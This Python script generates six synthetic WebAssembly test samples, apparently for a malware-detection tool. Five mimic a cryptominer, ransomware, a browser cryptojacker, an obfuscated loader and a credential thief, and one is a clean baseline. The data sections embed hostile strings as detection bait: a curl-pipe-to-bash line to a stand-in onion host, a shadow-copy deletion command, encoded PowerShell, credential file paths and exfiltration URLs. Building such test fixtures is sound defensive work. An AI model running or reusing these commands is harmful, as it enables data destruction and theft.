#!/usr/bin/env python3

# Test Sample Generator
#  Creates 6 synthetic WASM binaries covering different threat scenarios.
#  These are benign binaries that contain structural patterns (imports,
#  strings, constants) used to exercise all detection engines.

import struct, random, os

def leb_u(v):
    out = []
    while True:
        b = v & 0x7F; v >>= 7
        out.append(b|0x80 if v else b)
        if not v: break
    return bytes(out)

def leb_s(v):
    out=[]; more=True
    while more:
        b=v&0x7F; v>>=7
        if (v==0 and not(b&0x40)) or (v==-1 and(b&0x40)): more=False
        else: b|=0x80
        out.append(b)
    return bytes(out)

def ws(s):
    e=s.encode(); return leb_u(len(e))+e

def vec(items):
    return leb_u(len(items))+b''.join(items)

def sec(sid, body):
    return bytes([sid])+leb_u(len(body))+body

MAGIC   = b'\x00asm'
VERSION = b'\x01\x00\x00\x00'


def type_sec(types):
    # types: list of (params_list, returns_list) both as bytes
    entries = []
    for params, rets in types:
        entries.append(b'\x60'+leb_u(len(params))+params+leb_u(len(rets))+rets)
    return sec(1, vec(entries))

def import_func(mod, name, type_idx):
    return ws(mod)+ws(name)+b'\x00'+leb_u(type_idx)

def import_mem(mod, name, min_pages, max_pages=None):
    flags = b'\x01' if max_pages else b'\x00'
    body  = ws(mod)+ws(name)+b'\x02'+flags+leb_u(min_pages)
    if max_pages: body += leb_u(max_pages)
    return body

def func_body(locals_count, instructions):
    locs = leb_u(locals_count)+b'\x7f' if locals_count else b'\x00'
    body = leb_u(1 if locals_count else 0)+locs+instructions+b'\x0b'
    return leb_u(len(body))+body

def data_segment(offset, payload):
    return b'\x00\x41'+leb_s(offset)+b'\x0b'+leb_u(len(payload))+payload

def xor_loop(count=30):
    code = b''
    for _ in range(count):
        code += b'\x41\x00'  # i32.const 0
        code += b'\x41\x00'  # i32.const 0
        code += b'\x73'      # i32.xor
        code += b'\x1a'      # drop
    return code

def nop_sled(count=80):
    return b'\x01' * count

def sha256_constants():
    return (struct.pack('<I', 0x6a09e667) +
            struct.pack('<I', 0xbb67ae85) +
            struct.pack('<I', 0x3c6ef372) +
            struct.pack('<I', 0x510e527f) +
            struct.pack('<I', 0x428a2f98) +
            struct.pack('<I', 0x71374491))

def chacha20_constants():
    return (struct.pack('<I', 0x61707865) +  # expa
            struct.pack('<I', 0x3320646e) +  # nd 3
            struct.pack('<I', 0x79622d32) +  # 2-by
            struct.pack('<I', 0x6b206574))   # te k




# Sample 1: Cryptominer (SHA-256 + RandomX + C2 URL + start func)

def gen_cryptominer():
    t_sec = type_sec([
        (b'', b''),        # type 0: () -> ()
        (b'\x7f\x7f', b'\x7f'),  # type 1: (i32,i32)->i32
    ])
    imports = [
        import_func("env", "sha256_block",   0),
        import_func("env", "randomx_hash",   0),
        import_func("env", "keccak256",       1),
        import_func("env", "difficulty_check",1),
        import_func("env", "submit_nonce",    0),
        import_mem("memory","memory", 16),
    ]
    i_sec = sec(2, vec(imports))
    f_sec = sec(3, vec([leb_u(0)]))  # 1 function, type 0

    exports = [ws("mine")+b'\x00'+leb_u(5), ws("memory")+b'\x02'+leb_u(0)]
    e_sec   = sec(7, vec(exports))

    start_sec = sec(8, leb_u(5))  # func 5 = our only function

    payload = (
        sha256_constants() +
        struct.pack('<I', 0x9E3779B9) +   # TEA delta
        struct.pack('<I', 0xdeadbeef) +   # suspicious XOR key
        b"https://pool.xmr-mining-c2.onion/submit\x00" +
        b"bitcoin_wallet:1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2\x00" +
        b"hashrate_target\x00difficulty\x00nonce\x00" +
        b"monero:48edfHu7V9Z84YzzMa6fUueoELghf8r2RJHQiWc1kKpKq6faTb\x00"
    )

    code = nop_sled(90) + xor_loop(35) + b'\x10\x00'  # call sha256_block
    f_body_bytes = func_body(4, code)
    co_sec = sec(10, leb_u(1) + f_body_bytes)

    d_body = leb_u(1) + data_segment(0, payload)
    d_sec  = sec(11, d_body)

    return MAGIC + VERSION + t_sec + i_sec + f_sec + e_sec + start_sec + co_sec + d_sec



# Sample 2: WASI Ransomware dropper

def gen_ransomware():
    t_sec = type_sec([
        (b'', b''),
        (b'\x7f', b'\x7f'),
        (b'\x7f\x7f\x7f\x7f', b'\x7f'),
    ])
    imports = [
        import_func("wasi_snapshot_preview1","fd_write",   2),
        import_func("wasi_snapshot_preview1","fd_read",    2),
        import_func("wasi_snapshot_preview1","path_open",  2),
        import_func("wasi_snapshot_preview1","path_rename",2),
        import_func("wasi_snapshot_preview1","proc_exit",  1),
        import_func("wasi_snapshot_preview1","random_get", 2),
        import_mem("memory","memory", 4),
    ]
    i_sec = sec(2, vec(imports))
    f_sec = sec(3, vec([leb_u(0)]))
    exports = [ws("_start")+b'\x00'+leb_u(6), ws("encrypt_file")+b'\x00'+leb_u(6)]
    e_sec  = sec(7, vec(exports))

    payload = (
        chacha20_constants() +
        struct.pack('<I', 0xEDB88320) +  # CRC32 poly
        b"YOUR FILES HAVE BEEN ENCRYPTED\x00" +
        b"Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf Na\x00" +
        b"Use Tor Browser: http://ransomware2024decrypt.onion\x00" +
        b"ransom_note.txt\x00" +
        b"powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==\x00" +
        b"/bin/bash -c 'curl -s http://c2.malicious.onion/dropper | bash'\x00" +
        b"cmd.exe /c vssadmin delete shadows /all /quiet\x00" +
        b"bitcoin_address:1BoatSLRHtKNngkdXEeobR76b53LETtpyT\x00"
    )

    code = xor_loop(50) + nop_sled(60)  # XOR key schedule simulation
    f_body_bytes = func_body(8, code)
    co_sec = sec(10, leb_u(1) + f_body_bytes)
    d_body = leb_u(1) + data_segment(0, payload)
    d_sec  = sec(11, d_body)
    return MAGIC + VERSION + t_sec + i_sec + f_sec + e_sec + co_sec + d_sec



# Sample 3: Browser cryptojacker (localStorage + clipboard + C2)

def gen_browser_cryptojacker():
    t_sec = type_sec([(b'', b''), (b'\x7f', b'')])
    imports = [
        import_func("env","XMLHttpRequest",     0),
        import_func("env","WebSocket",          0),
        import_func("env","localStorage.getItem",1),
        import_func("env","document.cookie",    0),
        import_func("env","navigator.sendBeacon",1),
        import_func("env","clipboard.writeText", 1),
        import_func("env","geolocation.getCurrentPosition",0),
        import_func("env","performance.now",    0),
        import_mem("memory","memory", 8),
    ]
    i_sec = sec(2, vec(imports))
    f_sec = sec(3, vec([leb_u(0), leb_u(0)]))
    exports = [ws("mine_browser")+b'\x00'+leb_u(8), ws("exfil_cookies")+b'\x00'+leb_u(9)]
    e_sec  = sec(7, vec(exports))
    start  = sec(8, leb_u(8))

    payload = (
        sha256_constants() +
        b"https://coinhive-clone.c2.io/xmr/submit\x00" +
        b"wss://beacon.malicious.onion/ws\x00" +
        b"1CryptoClipHijackBTCaddr000000000000\x00" +
        b"eval(atob('aGVsbG8gd29ybGQ='))\x00" +
        b"exfil_endpoint=https://data-steal.io/collect\x00" +
        b"document.cookie\x00sessionStorage\x00localStorage\x00"
    )
    code1 = nop_sled(70) + xor_loop(40) + b'\x10\x00'
    code2 = xor_loop(25) + b'\x10\x03'  # call clipboard
    f1 = func_body(4, code1)
    f2 = func_body(2, code2)
    co_sec = sec(10, leb_u(2) + f1 + f2)
    d_body = leb_u(1) + data_segment(0, payload)
    d_sec  = sec(11, d_body)
    return MAGIC + VERSION + t_sec + i_sec + f_sec + e_sec + start + co_sec + d_sec



# Sample 4: Obfuscated loader (indirect calls + encrypted blob + custom sections)

def gen_obfuscated_loader():
    t_sec = type_sec([(b'',b''), (b'\x7f',b'\x7f')])
    table_sec = sec(4, leb_u(1) + b'\x70\x00' + leb_u(16))
    f_sec = sec(3, vec([leb_u(0)]*5))
    exports = [ws("run")+b'\x00'+leb_u(0), ws("decode")+b'\x00'+leb_u(1)]
    e_sec  = sec(7, vec(exports))
    start  = sec(8, leb_u(0))

    # High-entropy encrypted blob (simulated with PRNG)
    rng = random.Random(0xdeadbeef)
    encrypted_blob = bytes(rng.randint(0,255) for _ in range(1024))

    # Custom sections with suspicious names
    cs1_body = ws("__obf_payload") + encrypted_blob[:256]
    cs2_body = ws("__dbg_bypass") + b'\xde\xad\xbe\xef' * 16
    cs3_body = ws("__stage2_loader") + b'\x00\x61\x73\x6d' + bytes(32)
    cs1 = sec(0, cs1_body)
    cs2 = sec(0, cs2_body)
    cs3 = sec(0, cs3_body)

    funcs = []
    for i in range(5):
        code = nop_sled(65)
        code += xor_loop(28 + i*5)
        code += struct.pack('<I', 0x13371337)  # leet constant in body
        code += b'\x41\x00\x11\x01\x00'  # call_indirect type=1 table=0
        funcs.append(func_body(4, code))
    co_sec = sec(10, leb_u(5) + b''.join(funcs))

    d_body = leb_u(1) + data_segment(0, encrypted_blob[:512])
    d_sec  = sec(11, d_body)

    return MAGIC + VERSION + t_sec + table_sec + f_sec + e_sec + start + co_sec + d_sec + cs1 + cs2 + cs3



# Sample 5: WASI credential theft (SSH keys + AWS + /etc/shadow)

def gen_credential_thief():
    t_sec = type_sec([(b'',b''), (b'\x7f\x7f\x7f\x7f',b'\x7f')])
    imports = [
        import_func("wasi_snapshot_preview1","fd_read",    1),
        import_func("wasi_snapshot_preview1","fd_write",   1),
        import_func("wasi_snapshot_preview1","path_open",  1),
        import_func("wasi_snapshot_preview1","sock_send",  1),
        import_func("env","connect",                        1),
        import_func("env","send",                           1),
        import_mem("memory","memory", 4),
    ]
    i_sec = sec(2, vec(imports))
    f_sec = sec(3, vec([leb_u(0)]))
    exports = [ws("exfil")+b'\x00'+leb_u(6), ws("steal_creds")+b'\x00'+leb_u(6)]
    e_sec  = sec(7, vec(exports))
    start  = sec(8, leb_u(6))

    payload = (
        b"/etc/passwd\x00/etc/shadow\x00/root/.ssh/id_rsa\x00" +
        b"/home/ubuntu/.ssh/id_rsa\x00" +
        b"authorized_keys\x00known_hosts\x00" +
        b"AWS_ACCESS_KEY_ID\x00AWS_SECRET_ACCESS_KEY\x00" +
        b"AKIA1234567890EXAMPLE\x00" +
        b".kube/config\x00.aws/credentials\x00" +
        b"https://data-exfil.malicious.io/collect\x00" +
        b"DATABASE_URL\x00GITHUB_TOKEN\x00API_KEY\x00SECRET_KEY\x00" +
        b"inject\x00shellcode\x00reflective_loader\x00meterpreter\x00"
    )
    code = xor_loop(20) + b'\x10\x00\x10\x02\x10\x03'  # calls to path_open, fd_read, sock_send
    f_body_bytes = func_body(6, code)
    co_sec = sec(10, leb_u(1) + f_body_bytes)
    d_body = leb_u(1) + data_segment(0, payload)
    d_sec  = sec(11, d_body)
    return MAGIC + VERSION + t_sec + i_sec + f_sec + e_sec + start + co_sec + d_sec



# Sample 6: Clean baseline (fibonacci + add)

def gen_clean():
    t_sec = type_sec([(b'\x7f',b'\x7f'), (b'\x7f\x7f',b'\x7f')])
    f_sec = sec(3, vec([leb_u(0), leb_u(1)]))
    exports = [ws("fib")+b'\x00'+leb_u(0), ws("add")+b'\x00'+leb_u(1)]
    e_sec  = sec(7, vec(exports))

    # fib(n): if n<=1 return n; return fib(n-1)+fib(n-2)
    fib_code = (b'\x20\x00\x41\x01\x4c\x04\x7f\x20\x00\x05'  # local.get 0, i32.const 1, i32.lt_s, if
                b'\x20\x00\x41\x01\x6b\x10\x00'              # local.get 0-1, call fib
                b'\x20\x00\x41\x02\x6b\x10\x00'              # local.get 0-2, call fib
                b'\x6a\x0b\x0b')                              # i32.add, end, end
    add_code = b'\x20\x00\x20\x01\x6a'  # local.get 0, local.get 1, i32.add

    f1 = func_body(0, fib_code)
    f2 = func_body(0, add_code)
    co_sec = sec(10, leb_u(2) + f1 + f2)
    return MAGIC + VERSION + t_sec + f_sec + e_sec + co_sec




if __name__ == "__main__":
    samples = [
        ("sample_cryptominer.wasm",       gen_cryptominer,       "Cryptominer — SHA-256/RandomX/Keccak + .onion C2"),
        ("sample_ransomware.wasm",        gen_ransomware,        "WASI ransomware — ChaCha20 + BTC ransom note + PowerShell"),
        ("sample_browser_cryptojack.wasm",gen_browser_cryptojacker,"Browser cryptojacker — clipboard + cookie + C2"),
        ("sample_obfuscated_loader.wasm", gen_obfuscated_loader, "Obfuscated loader — indirect calls + encrypted blob + custom sections"),
        ("sample_credential_thief.wasm",  gen_credential_thief,  "Credential thief — SSH/AWS/shadow + WASI + network exfil"),
        ("sample_clean.wasm",             gen_clean,             "Clean baseline — fibonacci + add"),
    ]

    print("\n Test Sample Generator\n")
    for fname, gen_fn, desc in samples:
        data = gen_fn()
        with open(fname,'wb') as f: f.write(data)
        print(f"  [+] {fname:<42} {len(data):>6} bytes  {desc}")

    print(f"""
  Generated {len(samples)} test samples.

  Quick test:
    python3 wasmshark.py sample_cryptominer.wasm -v --html
    python3 wasmshark.py sample_ransomware.wasm -v --rules ./rules/ --plugins ./plugins/
    python3 wasmshark.py -d . --json --rules ./rules/
    python3 wasmshark.py sample_obfuscated_loader.wasm --cfg-dir ./cfgs/ --disasm

  eBPF runtime (needs wasmtime):
    sudo python3 wasmshark_ebpf.py --exec "wasmtime run sample_cryptominer.wasm" --timeout 30
""")
